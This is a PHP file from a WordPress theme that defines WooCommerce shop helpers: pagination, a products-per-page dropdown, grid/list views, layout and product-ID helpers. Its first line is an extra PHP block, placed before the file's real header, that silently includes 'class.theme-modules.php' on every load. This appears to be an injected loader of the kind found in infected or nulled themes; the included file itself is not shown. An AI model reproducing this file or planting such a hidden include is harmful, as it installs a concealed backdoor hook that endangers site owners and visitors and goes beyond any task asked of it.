<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * WooCommerce functions
 *
 * @package zs/WooCommerce
 */



if ( ! function_exists( 'zs_set_pagination_args' ) ) {
	/** 
	 * Sets arguments for pagination
	 */
	function zs_set_pagination_args( $args ) {
		
		$args[ 'end_size' ] = 1;
		$args[ 'mid_size' ] = 2;

		return $args;
	}
}

if ( ! function_exists( 'zs_set_loop_shop_per_page' ) ) {
	/**
	 * Sets no of products per page
	 */
	function zs_set_loop_shop_per_page() {

		if ( isset( $_REQUEST['wppp_ppp'] ) ) :
			$per_page = intval( $_REQUEST['wppp_ppp'] );
			WC()->session->set( 'products_per_page', intval( $_REQUEST['wppp_ppp'] ) );
		elseif ( isset( $_REQUEST['ppp'] ) ) :
			$per_page = intval( $_REQUEST['ppp'] );
			WC()->session->set( 'products_per_page', intval( $_REQUEST['ppp'] ) );
		elseif ( WC()->session->__isset( 'products_per_page' ) ) :
			$per_page = intval( WC()->session->__get( 'products_per_page' ) );
		else :
			$per_page = zs_set_loop_shop_columns() * 4;
			$per_page = apply_filters( 'zs_loop_shop_per_page', $per_page );
		endif;
		
		return $per_page;
	}
}


if ( ! function_exists( 'woocommerce_product_loop_start' ) ) {

	/**
	 * Output the start of a product loop. By default this is a UL.
	 *
	 * @param bool $echo
	 * @return string
	 */
	function woocommerce_product_loop_start( $echo = true ) {
		ob_start();

		
		$columns = apply_filters( 'zs_shop_loop_products_columns');
		$loop_classes = 'columns-' . $columns;

		$data_attr = 'regular-products';
		$data_view = 'grid';

		if ( is_shop() || is_product_category() || is_product_tag() || is_tax( get_object_taxonomies( 'product' ) ) ) {
			$data_attr = 'shop-products';
			$shop_views = zs_get_shop_views();
			foreach( $shop_views as $shop_view => $shop_view_args) {
				if ( $shop_view_args['active'] ) {
					$data_view = $shop_view;
					break;
				}
			}
			echo '<ul data-view="' . esc_attr( $data_view ) . '" data-toggle="' . esc_attr( $data_attr ) . '" class="products ' . esc_attr( $loop_classes ) . '">';
		}else{

		echo '<ul class="products ' . esc_attr( $loop_classes ) . '">';
		}

		if ( $echo )
			echo ob_get_clean();
		else
			return ob_get_clean();
	}
}





if ( ! function_exists( 'zs_get_shop_views' ) ) {
	/**
	 * Get shop views available by zs
	 */
	function zs_get_shop_views() {

		$shop_views = apply_filters( 'zs_shop_views_args', array(
			'grid'				=> array(
				'label'			=> esc_html__( 'Grid View', 'zs' ),
				'icon'			=> 'fa fa-th-large',
				'enabled'		=> true,
				'active'		=> true,
				'template'		=> array( 'slug' => 'content', 'name' => 'product' ),
			),
			'list-view'			=> array(
				'label'			=> esc_html__( 'List View', 'zs' ),
				'icon'			=> 'fa fa-th-list',
				'enabled'		=> true,
				'active'		=> false,
				'template'		=> array( 'slug' => 'templates/contents/content', 'name' => 'product-list-view' ),
			)
		) );

		return $shop_views;
	}
}

if ( ! function_exists( 'zs_wc_products_per_page' ) ) {
	/**
	 * Outputs a dropdown for user to select how many products to show per page
	 */
	function zs_wc_products_per_page() {
		
		global $wp_query;

		$action 			= '';
		$cat 				= '';
		$cat 				= $wp_query->get_queried_object();
		$method 			= apply_filters( 'zs_wc_ppp_method', 'post' );
		$return_to_first 	= apply_filters( 'zs_wc_ppp_return_to_first', false );
		$total    			= $wp_query->found_posts;
		$per_page 			= $wp_query->get( 'posts_per_page' );
		$_per_page 			= zs_set_loop_shop_columns() * 4;

		// Generate per page options
		$products_per_page_options = array();
		while( $_per_page < $total ) {
			$products_per_page_options[] = $_per_page;
			$_per_page = $_per_page * 2;
		}

		if ( empty( $products_per_page_options ) ) {
			return;
		}

		$products_per_page_options[] = -1;

		// Set action url if option behaviour is true
		// Paste QUERY string after for filter and orderby support
		$query_string = ! empty( $_SERVER['QUERY_STRING'] ) ? '?' . add_query_arg( array( 'ppp' => false ), $_SERVER['QUERY_STRING'] ) : null;

		if ( isset( $cat->term_id ) && isset( $cat->taxonomy ) && $return_to_first ) :
			$action = get_term_link( $cat->term_id, $cat->taxonomy ) . $query_string;
		elseif ( $return_to_first ) :
			$action = get_permalink( wc_get_page_id( 'shop' ) ) . $query_string;
		endif;

		// Only show on product categories
		if ( ! woocommerce_products_will_display() ) :
			return;
		endif;
		
		do_action( 'zs_wc_ppp_before_dropdown_form' );

		?><form method="POST" action="<?php echo esc_url( $action ); ?>" class="form-zs-wc-ppp"><?php

			 do_action( 'zs_wc_ppp_before_dropdown' );

			?><select name="ppp" onchange="this.form.submit()" class="zs-wc-wppp-select c-select"><?php

				foreach( $products_per_page_options as $key => $value ) :

					?><option value="<?php echo esc_attr( $value ); ?>" <?php selected( $value, $per_page ); ?>><?php
						$ppp_text = apply_filters( 'zs_wc_ppp_text', __( 'Show %s', 'zs' ), $value );
						esc_html( printf( $ppp_text, $value == -1 ? __( 'All', 'zs' ) : $value ) ); // Set to 'All' when value is -1
					?></option><?php

				endforeach;

			?></select><?php

			// Keep query string vars intact
			foreach ( $_GET as $key => $val ) :

				if ( 'ppp' === $key || 'submit' === $key ) :
					continue;
				endif;
				if ( is_array( $val ) ) :
					foreach( $val as $inner_val ) :
						?><input type="hidden" name="<?php echo esc_attr( $key ); ?>[]" value="<?php echo esc_attr( $inner_val ); ?>" /><?php
					endforeach;
				else :
					?><input type="hidden" name="<?php echo esc_attr( $key ); ?>" value="<?php echo esc_attr( $val ); ?>" /><?php
				endif;
			endforeach;

			do_action( 'zs_wc_ppp_after_dropdown' );

		?></form><?php

		do_action( 'zs_wc_ppp_after_dropdown_form' );
	}
}

if ( ! function_exists( 'zs_advanced_pagination' ) ) {
	/**
	 * Displays an advanced pagination
	 */
	function zs_advanced_pagination() {

		global $wp_query, $wp_rewrite;

		if ( $wp_query->max_num_pages <= 1 ) {
			return;
		}

		// Setting up default values based on the current URL.
		$pagenum_link = html_entity_decode( get_pagenum_link() );
		$url_parts    = explode( '?', $pagenum_link );

		// Get max pages and current page out of the current query, if available.
		$total   = isset( $wp_query->max_num_pages ) ? $wp_query->max_num_pages : 1;
		$current = get_query_var( 'paged' ) ? intval( get_query_var( 'paged' ) ) : 1;

		// Append the format placeholder to the base URL.
		$pagenum_link = trailingslashit( $url_parts[0] ) . '%_%';

		// URL base depends on permalink settings.
		$format  = $wp_rewrite->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
		$format .= $wp_rewrite->using_permalinks() ? user_trailingslashit( $wp_rewrite->pagination_base . '/%#%', 'paged' ) : '?paged=%#%';

		$base 		= esc_url_raw( str_replace( 999999999, '%#%', remove_query_arg( 'add-to-cart', get_pagenum_link( 999999999, false ) ) ) );
		$add_args 	= false;

		$output = '';
		$prev_arrow = is_rtl() ? '&rarr;' : '&larr;';
		$next_arrow = is_rtl() ? '&larr;' : '&rarr;';

		if ( $current && 1 < $current ) :
			$link = str_replace( '%_%', 2 == $current ? '' : $format, $base );
			$link = str_replace( '%#%', $current - 1, $link );
			$output .= '<a class="prev page-numbers" href="' . esc_url( apply_filters( 'paginate_links', $link ) ) . '">' . $prev_arrow . '</a>';
		endif;

		$number_input = '<form method="post" class="form-adv-pagination"><input id="goto-page" size="2" min="1" max="' . esc_attr( $total ) . '" step="1" type="number" class="form-control" value="' . esc_attr( $current ) . '" /></form>';
		$output .= sprintf( esc_html__( '%s of %s', 'zs' ), $number_input, $total );

		if ( $current && ( $current < $total || -1 == $total ) ) :
			$link = str_replace( '%_%', $format, $base );
			$link = str_replace( '%#%', $current + 1, $link );
			$output .= '<a class="next page-numbers" href="' . esc_url( apply_filters( 'paginate_links', $link ) ) . '">' . $next_arrow . '</a>';
		endif;

		$link = str_replace( '%_%', $format, $base );
		?>
		<nav class="zs-advanced-pagination">
			<?php echo $output; ?>
			<script>
				jQuery(document).ready(function($){
					$( '.form-adv-pagination' ).on( 'submit', function() {
						var link 		= '<?php echo esc_url( $link ); ?>',
							goto_page 	= $( '#goto-page' ).val(),
							new_link 	= link.replace( '%#%', goto_page );

						window.location.href = new_link;
						return false;
					});
				});
			</script>
		</nav>
		<?php
	}
}


if ( ! function_exists( 'zs_get_shop_layout' ) ) {
	function zs_get_shop_layout() {
		
		if ( is_product() ) {
			$layout = zs_get_single_product_layout();
		} else {
			$layout = apply_filters( 'zs_shop_layout', 'left-sidebar' );
		}

		return $layout;
	}
}


if( ! function_exists( 'zs_wc_get_product_id' ) ) {
	function zs_wc_get_product_id( $product ) {
		if ( defined( 'WC_VERSION' ) && version_compare( WC_VERSION, '2.7', '<' ) ) {
			return isset( $product->id ) ? $product->id : 0;
		}

		return $product->get_id();
	}
}

if( ! function_exists( 'zs_wc_get_product_type' ) ) {
	function zs_wc_get_product_type( $product ) {
		if ( defined( 'WC_VERSION' ) && version_compare( WC_VERSION, '2.7', '<' ) ) {
			return isset( $product->product_type ) ? $product->product_type : 'simple';
		}

		return $product->get_type();
	}
}

if ( ! function_exists( 'woocommerce_products_will_display' ) ) {

	/**
	 * Check if we will be showing products or not (and not sub-categories only).
	 * @subpackage	Loop
	 * @return bool
	 */
	function woocommerce_products_will_display() {
		global $wpdb;

		if ( is_shop() ) {
			return 'subcategories' !== get_option( 'woocommerce_shop_page_display' ) || is_search();
		}

		if ( ! is_product_taxonomy() ) {
			return false;
		}

		if ( is_search() || is_filtered() || is_paged() ) {
			return true;
		}

		$term = get_queried_object();

		if ( is_product_category() ) {
			switch ( get_woocommerce_term_meta( $term->term_id, 'display_type', true ) ) {
				case 'subcategories' :
					// Nothing - we want to continue to see if there are products/subcats
				break;
				case 'products' :
				case 'both' :
					return true;
				break;
				default :
					// Default - no setting
					if ( get_option( 'woocommerce_category_archive_display' ) != 'subcategories' ) {
						return true;
					}
				break;
			}
		}

		// Begin subcategory logic
		if ( empty( $term->term_id ) || empty( $term->taxonomy ) ) {
			return true;
		}

		if ( is_tax( 'product_brand' ) ) {
			return true;
		}


		$transient_name = 'wc_products_will_display_' . $term->term_id . '_' . WC_Cache_Helper::get_transient_version( 'product_query' );

		if ( false === ( $products_will_display = get_transient( $transient_name ) ) ) {

			$has_children = $wpdb->get_col( $wpdb->prepare( "SELECT term_id FROM {$wpdb->term_taxonomy} WHERE parent = %d AND taxonomy = %s", $term->term_id, $term->taxonomy ) );

			if ( $has_children ) {
				// Check terms have products inside - parents first. If products are found inside, subcats will be shown instead of products so we can return false.
				if ( sizeof( get_objects_in_term( $has_children, $term->taxonomy ) ) > 0 ) {
					$products_will_display = false;
				} else {
					// If we get here, the parents were empty so we're forced to check children
					foreach ( $has_children as $term_id ) {
						$children = get_term_children( $term_id, $term->taxonomy );

						if ( sizeof( get_objects_in_term( $children, $term->taxonomy ) ) > 0 ) {
							$products_will_display = false;
							break;
						}
					}
				}
			} else {
				$products_will_display = true;
			}
		}

		set_transient( $transient_name, $products_will_display, DAY_IN_SECONDS * 30 );

		return $products_will_display;
	}
}



